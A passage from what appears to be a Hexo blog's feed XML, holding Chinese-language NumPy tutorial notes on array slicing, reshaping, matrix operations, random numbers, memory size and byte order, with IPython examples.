class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">array([[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>],</span><br><span class="line">       [ <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>],</span><br><span class="line">       [ <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>]])</span><br><span class="line"><span class="comment"># åˆ‡å‰ä¸¤ç»´æ•°ç»„</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b[:<span class="number">2</span>]</span><br><span class="line">array([[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">       [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]])</span><br><span class="line"><span class="comment"># åˆ‡æŸä¸€åˆ—</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b[:,<span class="number">2</span>]</span><br><span class="line">array([ <span class="number">2</span>,  <span class="number">6</span>, <span class="number">10</span>])</span><br></pre></td></tr></table></figure><p>ä¸‰ç»´æ•°ç»„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">3</span>]: t</span><br><span class="line">Out[<span class="number">3</span>]:</span><br><span class="line">array([[[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>],</span><br><span class="line">        [ <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>],</span><br><span class="line">        [ <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>]],</span><br><span class="line"></span><br><span class="line">       [[<span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>],</span><br><span class="line">        [<span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>],</span><br><span class="line">        [<span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>]]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…¨éƒ¨ç»´åº¦ï¼Œå…¨éƒ¨è¡Œï¼Œç¬¬ä¸€åˆ—</span></span><br><span class="line">In [<span class="number">4</span>]: t[:,:,<span class="number">0</span>]</span><br><span class="line">Out[<span class="number">4</span>]:</span><br><span class="line">array([[ <span class="number">0</span>,  <span class="number">4</span>,  <span class="number">8</span>],</span><br><span class="line">       [<span class="number">12</span>, <span class="number">16</span>, <span class="number">20</span>]])</span><br><span class="line"><span class="comment"># å…¨éƒ¨ç»´åº¦ï¼Œç¬¬ä¸‰è¡Œï¼Œç¬¬ä¸€åˆ—</span></span><br><span class="line">In [<span class="number">5</span>]: t[:,<span class="number">2</span>,<span class="number">0</span>]</span><br><span class="line">Out[<span class="number">5</span>]: array([ <span class="number">8</span>, <span class="number">20</span>])</span><br><span class="line"><span class="comment"># å…¨éƒ¨ç»´åº¦ï¼Œç¬¬1ï¼Œ2è¡Œï¼Œç¬¬ä¸€åˆ—</span></span><br><span class="line">In [<span class="number">6</span>]: t[:,<span class="number">0</span>:<span class="number">2</span>,<span class="number">0</span>]</span><br><span class="line">Out[<span class="number">6</span>]:</span><br><span class="line">array([[ <span class="number">0</span>,  <span class="number">4</span>],</span><br><span class="line">       [<span class="number">12</span>, <span class="number">16</span>]])</span><br></pre></td></tr></table></figure><h2 id="æ”¹å˜æ•°ç»„å½¢çŠ¶">æ”¹å˜æ•°ç»„å½¢çŠ¶</h2><table><thead><tr class="header"><th>å‡½æ•°</th><th>åŠŸèƒ½æè¿°</th></tr></thead><tbody><tr class="odd"><td>np.reshape(shape)</td><td>ä¸æ”¹å˜å½“å‰æ•°ç»„,æŒ‰ç…§ shape åˆ›å»ºæ–°çš„æ•°ç»„</td></tr><tr class="even"><td>np.resize(shape)</td><td>æ”¹å˜å½“å‰æ•°ç»„,æŒ‰ç…§ shape åˆ›å»ºæ•°ç»„</td></tr></tbody></table><p>æ³¨æ„ï¼šå½“æ”¹å˜å½¢çŠ¶æ—¶ï¼Œåº”è¯¥è€ƒè™‘åˆ°æ•°ç»„ä¸­å…ƒç´ çš„ä¸ªæ•°ï¼Œç¡®ä¿æ”¹å˜å‰åï¼Œå…ƒç´ æ€»ä¸ªæ•°ç›¸ç­‰ã€‚</p><p>åˆ›å»ºæ•°ç»„ï¼Œå¹¶æ”¹å˜æ•°ç»„å½¢çŠ¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">63</span>]: a=np.logspace(<span class="number">0</span>,<span class="number">5</span>,<span class="number">6</span>,base=<span class="number">2</span>,dtype=np.int64).reshape(<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">64</span>]: a</span><br><span class="line">Out[<span class="number">64</span>]:</span><br><span class="line">array([[ <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">4</span>],</span><br><span class="line">       [ <span class="number">8</span>, <span class="number">16</span>, <span class="number">32</span>]])</span><br></pre></td></tr></table></figure><p>np.reshape(shape) ä¸­ shape çš„å€¼å¯ä»¥æŠŠå…¶ä¸­çš„æŸä¸€ä¸ªç»´åº¦è®¾ç½®ä¸º -1ï¼Œè®©numpyæ ¹æ®æ•°ç»„ä¸­å…ƒç´ æ€»ä¸ªæ•°ã€ä»¥åŠå…¶ä»–ç»´åº¦çš„å–å€¼ï¼Œæ¥è‡ªåŠ¨è®¡ç®—å‡ºè¿™ä¸ªç»´åº¦çš„å–å€¼ã€‚ä¾‹å¦‚ï¼šå°†å¤šç»´è½¬æ¢ä¸ºä¸€ç»´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">67</span>]: a</span><br><span class="line">Out[<span class="number">67</span>]:</span><br><span class="line">array([[ <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">4</span>],</span><br><span class="line">       [ <span class="number">8</span>, <span class="number">16</span>, <span class="number">32</span>]])</span><br><span class="line"></span><br><span class="line">In [<span class="number">68</span>]: a.reshape(-<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">Out[<span class="number">68</span>]:</span><br><span class="line">array([[ <span class="number">1</span>],</span><br><span class="line">       [ <span class="number">2</span>],</span><br><span class="line">       [ <span class="number">4</span>],</span><br><span class="line">       [ <span class="number">8</span>],</span><br><span class="line">       [<span class="number">16</span>],</span><br><span class="line">       [<span class="number">32</span>]])</span><br></pre></td></tr></table></figure><h2 id="æ•°ç»„è¿ç®—">æ•°ç»„è¿ç®—</h2><p>numpy æ”¯æŒæ•°ç»„çš„å››åˆ™è¿ç®—å’Œé€†è¿ç®—.ä¸€ç»´æ•°ç»„å¯ä»¥å’Œå¤šç»´æ•°ç»„ç›¸åŠ ï¼Œç›¸åŠ æ—¶ï¼Œä¼šå°†ä¸€ç»´æ•°ç»„æ‰©å±•åˆ°å¤šç»´ã€‚å½“ä¸¤ä¸ªæ•°ç»„ä¸­å…ƒç´ çš„æ•°æ®ç±»å‹ä¸åŒæ—¶ï¼Œç²¾åº¦ä½çš„æ•°æ®ç±»å‹ï¼Œä¼šè‡ªåŠ¨è½¬æ¢ä¸ºç²¾åº¦æ›´é«˜çš„æ•°æ®ç±»å‹ï¼Œç„¶åå†è¿›è¡Œè¿ç®—ã€‚</p><p>å¹‚è¿ç®—ï¼šå¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ æ±‚ n æ¬¡æ–¹</p><p>çŸ©é˜µç›¸ä¹˜ï¼š</p><ul><li>ä¹˜å·è¿ç®—ç¬¦ï¼šçŸ©é˜µä¸­å¯¹åº”çš„å…ƒç´ åˆ†åˆ«ç›¸ä¹˜ï¼Œc=a*b</li><li>çŸ©é˜µç›¸ä¹˜ï¼ˆç‚¹ä¹˜ï¼‰ï¼šæŒ‰ç…§çŸ©é˜µç›¸ä¹˜çš„è§„åˆ™è¿ç®— np.matmul(a,b)np.dot(a,b)</li></ul><p>çŸ©é˜µè½¬ç½®å’Œæ±‚é€† çŸ©é˜µè½¬ç½®ï¼šnp.transpose(a)çŸ©é˜µæ±‚é€†ï¼šnp.linalg.inv(a)</p><h2 id="æ•°ç»„å…ƒç´ ä¹‹é—´çš„è¿ç®—">æ•°ç»„å…ƒç´ ä¹‹é—´çš„è¿ç®—</h2><table><thead><tr class="header"><th>å‡½æ•°</th><th>åŠŸèƒ½æè¿°</th></tr></thead><tbody><tr class="odd"><td>numpy.sum()</td><td>è®¡ç®—æ‰€æœ‰å…ƒç´ çš„å’Œ</td></tr><tr class="even"><td>numpy.prod()</td><td>è®¡ç®—æ‰€æœ‰å…ƒç´ çš„ä¹˜ç§¯</td></tr><tr class="odd"><td>numpy.dif()</td><td>è®¡ç®—æ•°ç»„çš„ç›¸é‚»å…ƒç´ ä¹‹é—´çš„å·®</td></tr><tr class="even"><td>np.sqrt()</td><td>è®¡ç®—å„å…ƒç´ çš„å¹³æ–¹æ ¹</td></tr><tr class="odd"><td>np.exp()</td><td>è®¡ç®—å„å…ƒç´ çš„æŒ‡æ•°å€¼</td></tr><tr class="even"><td>np.abs()</td><td>å–å„å…ƒç´ çš„ç»å¯¹å€¼</td></tr></tbody></table><h3 id="æ±‚å’Œ">æ±‚å’Œ</h3><p>è½´ï¼ˆaxisï¼‰ï¼šæ•°ç»„ä¸­çš„<strong>æ¯ä¸€ä¸ªç»´åº¦</strong>è¢«ç§°ä¸ºä¸€ä¸ª<strong>è½´</strong>ã€‚ç§©ï¼ˆrankï¼‰ï¼šè½´çš„ä¸ªæ•°ã€‚</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151051607795.jpg"alt="16151051607795" /><figcaption aria-hidden="true">16151051607795</figcaption></figure><h3 id="æ•°ç»„å †å ">æ•°ç»„å †å </h3><p><code>np.stack((æ•°ç»„1ï¼Œæ•°ç»„2,..), axis)</code>åœ¨ä¸åŒçš„è½´æ–¹å‘ä¸Šï¼Œè¿›è¡Œå †å ,æ–°å‡ºç°çš„è½´æ˜¯å“ªä¸ªè½´ï¼Œaxis=å‡ </p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151055149631.jpg"alt="16151055149631" /><figcaption aria-hidden="true">16151055149631</figcaption></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">120</span>]: a = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line"></span><br><span class="line">In [<span class="number">121</span>]: b = np.array([[<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>], [<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>]])</span><br><span class="line"></span><br><span class="line">In [<span class="number">122</span>]: c=np.stack((a, b), axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">123</span>]: c</span><br><span class="line">Out[<span class="number">123</span>]:</span><br><span class="line">array([[[ <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>],</span><br><span class="line">        [ <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>]],</span><br><span class="line"></span><br><span class="line">       [[ <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>],</span><br><span class="line">        [<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>]]])</span><br><span class="line"></span><br><span class="line">In [<span class="number">124</span>]: <span class="built_in">print</span>(c.shape)</span><br><span class="line">(<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br></pre></td></tr></table></figure><h2 id="çŸ©é˜µå’Œéšæœºæ•°">çŸ©é˜µå’Œéšæœºæ•°</h2><p>numpy.matrix</p><p>matrix(å­—ç¬¦ä¸²/åˆ—è¡¨/å…ƒç»„/æ•°ç»„) / mat(å­—ç¬¦ä¸²/åˆ—è¡¨/å…ƒç»„/æ•°ç»„)å½“å‚æ•°ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œå„ä¸ªå…ƒç´ ä¹‹é—´ç©ºæ ¼åˆ†å‰²ï¼Œä¸åŒè¡Œç”¨åˆ†å·åˆ†å‰²ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">128</span>]: a=np.mat(<span class="string">&quot;1 2 3;4 5 6&quot;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">129</span>]: a</span><br><span class="line">Out[<span class="number">129</span>]:</span><br><span class="line">matrix([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">        [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line">In [<span class="number">131</span>]: a=np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]])</span><br><span class="line">In [<span class="number">133</span>]: m=np.mat(a)</span><br><span class="line"></span><br><span class="line">In [<span class="number">134</span>]: m</span><br><span class="line">Out[<span class="number">134</span>]:</span><br><span class="line">matrix([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">        [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line"></span><br><span class="line">In [<span class="number">135</span>]: <span class="built_in">type</span>(a), <span class="built_in">type</span>(m)</span><br><span class="line">Out[<span class="number">135</span>]: (numpy.ndarray, numpy.matrix)</span><br></pre></td></tr></table></figure><p>çŸ©é˜µå¯¹è±¡, åŒæ ·å…·å¤‡ ndimï¼Œshapeï¼Œsizeï¼Œdtype å±æ€§ã€‚</p><h3 id="çŸ©é˜µè¿ç®—">çŸ©é˜µè¿ç®—</h3><p>çŸ©é˜µä¹‹é—´ä¹˜å·æ˜¯çŸ©é˜µç›¸ä¹˜ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">In [140]: a1,a2</span><br><span class="line">Out[140]:</span><br><span class="line">(matrix([[0, 1],</span><br><span class="line">         [2, 3]]),</span><br><span class="line"> matrix([[1, 1],</span><br><span class="line">         [2, 0]]))</span><br><span class="line"></span><br><span class="line">In [141]: a3=a1*a2</span><br><span class="line"></span><br><span class="line">In [142]: a3</span><br><span class="line">Out[142]:</span><br><span class="line">matrix([[2, 0],</span><br><span class="line">        [8, 2]])</span><br></pre></td></tr></table></figure><p>çŸ©é˜µè½¬ç½®ï¼š<code>.T</code>ï¼Œ çŸ©é˜µæ±‚é€†ï¼š<code>.I</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">144</span>]: a1.T</span><br><span class="line">Out[<span class="number">144</span>]:</span><br><span class="line">matrix([[<span class="number">0</span>, <span class="number">2</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">3</span>]])</span><br><span class="line"></span><br><span class="line">In [<span class="number">145</span>]: a1.I</span><br><span class="line">Out[<span class="number">145</span>]:</span><br><span class="line">matrix([[-<span class="number">1.5</span>,  <span class="number">0.5</span>],</span><br><span class="line">        [ <span class="number">1.</span> ,  <span class="number">0.</span> ]])</span><br></pre></td></tr></table></figure><h2 id="çŸ©é˜µ-vs-äºŒç»´æ•°ç»„">çŸ©é˜µ vs äºŒç»´æ•°ç»„</h2><p>numpy ä¸­çš„çŸ©é˜µå’ŒäºŒç»´æ•°ç»„ç›¸ä¼¼ï¼Œåœ¨å¾ˆå¤šæ—¶å€™æ˜¯é€šç”¨çš„</p><table><thead><tr class="header"><th>çŸ©é˜µ</th><th>äºŒç»´æ•°ç»„</th></tr></thead><tbody><tr class="odd"><td>è¿ç®—ç¬¦å·ç®€å•; A*B</td><td>èƒ½å¤Ÿè¡¨ç¤ºé«˜ç»´æ•°ç»„; æ•°ç»„æ›´åŠ çµæ´»ï¼Œé€Ÿåº¦æ›´å¿«</td></tr></tbody></table><h3 id="éšæœºæ•°">éšæœºæ•°</h3><table><colgroup><col style="width: 41%" /><col style="width: 51%" /><col style="width: 6%" /></colgroup><thead><tr class="header"><th>å‡½æ•°</th><th>åŠŸèƒ½æè¿°</th><th>è¿”å›å€¼</th></tr></thead><tbody><tr class="odd"><td>np.random.rand(d1,.,dn)</td><td>å…ƒç´ åœ¨[0,1)åŒºé—´å‡åŒ€åˆ†å¸ƒçš„æ•°ç»„</td><td>æµ®ç‚¹æ•°</td></tr><tr class="even"><td>np.random.uniform(low,high,size)</td><td>å…ƒç´ åœ¨[low,high)åŒºé—´å‡åŒ€åˆ†å¸ƒçš„æ•°ç»„</td><td>æµ®ç‚¹æ•°</td></tr><tr class="odd"><td>numpy.random.randint(low,high, size)</td><td>å…ƒç´ åœ¨[low,high)åŒºé—´å‡åŒ€åˆ†å¸ƒçš„æ•°ç»„</td><td>æ•´æ•°</td></tr><tr class="even"><td>np.random.randn(d0,.,dn)</td><td>äº§ç”Ÿæ ‡å‡†æ­£æ€åˆ†å¸ƒçš„æ•°ç»„</td><td>æµ®ç‚¹æ•°</td></tr><tr class="odd"><td>np.random.normal(loc, scale, size)</td><td>äº§ç”Ÿå‡å€¼ä¸º locï¼Œæ–¹å·®ä¸º scale çš„æ­£æ€åˆ†å¸ƒçš„æ•°ç»„</td><td>æµ®ç‚¹æ•°</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [27]: np.random.normal(0,1,(3,2))</span><br><span class="line">Out[27]:</span><br><span class="line">array([[-2.01119139, -0.66620011],</span><br><span class="line">       [-1.61697634, -1.14187373],</span><br><span class="line">       [-0.51972518, -1.73302281]])</span><br></pre></td></tr></table></figure><p>ä¼ªéšæœºæ•°ï¼šç”±éšæœºç§å­ï¼Œæ ¹æ®ä¸€å®šçš„ç®—æ³•ç”Ÿæˆçš„ã€‚éšæœºç§å­ï¼šæŒ‡å®šéšæœºæ•°ç”Ÿæˆæ—¶æ‰€ç”¨ç®—æ³•å¼€å§‹çš„æ•´æ•°å€¼ã€‚</p><ol type="1"><li>å¦‚æœä½¿ç”¨ç›¸åŒçš„ seedï¼ˆï¼‰å€¼ï¼Œåˆ™æ¯æ¬¡ç”Ÿæˆçš„éšå³æ•°éƒ½ç›¸åŒã€‚</li><li>å¦‚æœä¸è®¾ç½®è¿™ä¸ªå€¼ï¼Œåˆ™ç³»ç»Ÿæ ¹æ®æ—¶é—´æ¥è‡ªå·±é€‰æ‹©è¿™ä¸ªå€¼ï¼Œæ­¤æ—¶æ¯æ¬¡ç”Ÿæˆçš„éšæœºæ•°å› æ—¶é—´å·®å¼‚è€Œä¸åŒã€‚</li><li>é‡‡ç”¨ seedï¼ˆï¼‰å‡½æ•°è®¾ç½®éšæœºç§å­ï¼Œä»…ä¸€æ¬¡æœ‰æ•ˆã€‚</li><li>éšæœºæ•°äº§ç”Ÿçš„ç®—æ³•ï¼Œå’Œç³»ç»Ÿæœ‰å…³ã€‚</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">np.random.seed(num) è®¾ç½®éšæœºæ•°ç§å­</span><br><span class="line">np.random.shuffle(åºåˆ—) # æ‰“ä¹±åºåˆ—é¡ºåºï¼Œå¯¹äºå¤šç»´æ•°ç»„ï¼Œåªæ‰“ä¹±ç¬¬ä¸€ç»´</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>numpy çŸ¥è¯†ç‚¹</title>
      <link href="/blog/2022/06/15/programming/python/ai/np_skills/"/>
      <url>/blog/2022/06/15/programming/python/ai/np_skills/</url>
      
        <content type="html"><![CDATA[<h1 id="numpy-tips">Numpy Tips</h1><h2 id="æ•°æ®å­˜å‚¨å¤§å°">æ•°æ®å­˜å‚¨å¤§å°</h2><p>å¯¹äºå•ä¸ªæ•°æ®ç±»å‹è€Œè¨€ï¼šå¯¹äº np.int, np.floatç­‰ï¼Œä¸æŒ‡æ˜ä½æ•°çš„ç±»å‹ï¼Œä¾èµ–äºå¹³å°æ˜¯ 32 ä½è¿˜æ˜¯ 64 ä½ã€‚å¯¹äº np.int32,np.float64 ç­‰æŒ‡æ˜ä½æ•°çš„ç±»å‹ï¼Œå­—èŠ‚æ•°ä¾¿æ˜¯å…¶æŒ‡æ˜çš„ä½æ•°/8ï¼Œæ¯”å¦‚ï¼šnp.int32æ•°æ®å­˜å‚¨å ç”¨ 4 bytes, np.float64 æ•°æ®å­˜å‚¨å ç”¨ 8 bytesã€‚</p><p>å¯¹äºæ•°ç»„è€Œè¨€ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">In [39]: a</span><br><span class="line">Out[39]:</span><br><span class="line">array([[1.2, 1.3],</span><br><span class="line">       [0. , 0. ]])</span><br><span class="line"></span><br><span class="line">In [40]: a.dtype</span><br><span class="line">Out[40]: dtype(&#x27;float64&#x27;)</span><br><span class="line"></span><br><span class="line">In [41]: a.itemsize</span><br><span class="line">Out[41]: 8</span><br><span class="line"></span><br><span class="line">In [42]: a.nbytes</span><br><span class="line">Out[42]: 32</span><br><span class="line"></span><br><span class="line">In [43]: a.size</span><br><span class="line">Out[43]: 4</span><br><span class="line"></span><br><span class="line">In [44]: a.itemsize * a.size</span><br><span class="line">Out[44]: 32</span><br><span class="line"></span><br><span class="line">In [45]: a.itemsize * a.size == a.nbytes</span><br><span class="line">Out[45]: True</span><br></pre></td></tr></table></figure><p>arr.nbytes = arr.itemsize * arr.size arr.itemsizeè¿”å›ä¸€ä¸ªæ•°ç»„å…ƒç´ çš„å­—èŠ‚å¤§å° arr.size è¿”å›æ•°ç»„å…ƒç´ çš„ä¸ªæ•° arr.size=np.prod(arr.shape) arr.nbytes è¿”å›æ•´ä¸ªæ•°ç»„å­˜å‚¨æ•°æ®æ‰€éœ€è¦çš„å­—èŠ‚å¤§å°</p><p>nbytesï¼š Total bytes consumed by the elements of the array. Does notinclude memory consumed by non-element attributes of the arrayobject.</p><p>æ³¨ï¼š<code>sys.getsizeof</code> è¿”å›ä»»æ„ pythonå¯¹è±¡çš„å†…å­˜å ç”¨å¤§å°ï¼Œä¸€ä¸ª numpy æ•°ç»„æ‰€å ç”¨çš„å†…å­˜=æ•°ç»„çš„æ•°æ®å­˜å‚¨ +overheadï¼ˆshapeï¼Œdtypeï¼Œstridesï¼‰ç­‰ç›¸å…³ä¿¡æ¯ï¼Œoverheadå¯¹äºå¤§æ•°ç»„æ¥è¯´ï¼Œå¯ä»¥å¿½ç•¥ä¸è®¡ã€‚</p><h2 id="å‚è€ƒ">å‚è€ƒï¼š</h2><p><ahref="https://stackoverflow.com/questions/9395758/how-much-memory-is-used-by-a-numpy-ndarray">python- How much memory is used by a numpy ndarray? - Stack Overflow</a> <ahref="https://stackoverflow.com/questions/35421869/nbytes-and-getsizeof-return-different-values">python- nbytes and getsizeof return different values - Stack Overflow</a></p><h2 id="æ•°æ®å­˜å‚¨ç±»å‹ä»¥åŠå¤§å°ç«¯">æ•°æ®å­˜å‚¨ç±»å‹ä»¥åŠå¤§å°ç«¯</h2><p>å¤§ç«¯å­—èŠ‚åºï¼ˆbig endianï¼‰å’Œå°ç«¯å­—èŠ‚åºï¼ˆlittle endianï¼‰</p><p>Endian-ness.</p><p>MSB stands for most significant bit, while LSB is least significantbit. In binary terms, the MSB is the bit that has the greatest effect onthe number, and it is the left-most bit.</p><p>Little-endian (LSB first) means we start with the least significantpart in the lowest address.</p><p>Big-endian (MSB first) means we start with the most significant part.å¤§ç«¯æ¨¡å¼ï¼Œæ˜¯æŒ‡æ•°æ®çš„é«˜å­—èŠ‚ä½ä¿å­˜åœ¨å†…å­˜çš„ä½åœ°å€ä¸­ï¼Œè€Œæ•°æ®çš„ä½å­—èŠ‚ä½ä¿å­˜åœ¨å†…å­˜çš„é«˜åœ°å€ä¸­ã€‚è¿™æ ·çš„å­˜å‚¨æ¨¡å¼æœ‰ç‚¹å„¿ç±»ä¼¼äºæŠŠæ•°æ®å½“ä½œå­—ç¬¦ä¸²é¡ºåºå¤„ç†ã€‚å¤§ç«¯æ¨¡å¼é¡ºåºè·Ÿå­—ç¬¦ä¸²ä¸€æ ·ã€‚å·¦è¾¹æ˜¯ä½åœ°å€ï¼Œç„¶åé¡ºåºå’Œæˆ‘ä»¬æ—¥å¸¸ä¹¦å†™ä¸€æ ·ã€‚</p><p>numpy çš„ dtype å¯ä»¥ç®€è¦æŒ‡å®šå¤§å°ç«¯ä»¥åŠç±»å‹ï¼Œå«åš One-characterstrings/Array-protocol type strings.æ¯ä¸€ä¸ªç±»å‹éƒ½æœ‰ä¸€ä¸ªç¼©å†™å­—æ¯ä¸ä¹‹å¯¹åº”ã€‚</p><p>å¤§å°ç«¯è¡¨ç¤ºï¼š</p><p><ahref="https://numpy.org/doc/stable/reference/generated/numpy.dtype.byteorder.html">numpy.dtype.byteorderâ€” NumPy v1.24 Manual</a></p><p>â€˜=â€™ ï¼šnativeï¼Œ â€˜&lt;â€™ï¼šlittle-endianï¼Œ â€˜&gt;â€™ï¼šbig-endianï¼Œ â€˜|â€™ï¼šnotapplicable</p><p>dt = np.dtype('&lt;i4') # 32-bit little-endian signed integer dt =np.dtype('&gt;f8') # 64-bit big-endian floating-point number, np.float64dt = np.dtype('c16') # 128-bit complex floating-point number dt =np.dtype('a25') # 25-length zero-terminated bytes dt = np.dtype('U25') #25-character string</p><p>å­—æ¯åé¢æ•°å­—æ˜¯å­—èŠ‚æ•°</p><p><ahref="https://numpy.org/doc/stable/reference/arrays.dtypes.html">Datatype objects (dtype) â€” NumPy v1.24 Manual</a></p><h2 id="çŸ©é˜µåˆ†å—ä¹˜ç§¯">çŸ©é˜µåˆ†å—ä¹˜ç§¯</h2><p>çŸ©é˜µåˆ†å—ä¹˜æ³•ï¼Œä½¿ç”¨ np.tensordot æŒ‡å®šçº¦å‡ axis ï¼ˆ10ï¼Œ3ï¼‰ ï¼ˆ3ï¼Œ2ï¼Œ3ï¼‰-&gt; (10,2,3)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.tensordot(arr_a, arr_b, axes=((<span class="number">1</span>), (<span class="number">0</span>))) <span class="comment"># return eval_ys</span></span><br></pre></td></tr></table></figure><h2 id="numpy-padding">numpy padding</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">random_pad</span>(<span class="params">vec, pad_width, *_, **__</span>):</span><br><span class="line">            vec[:pad_width[<span class="number">0</span>]] = np.random.randint(<span 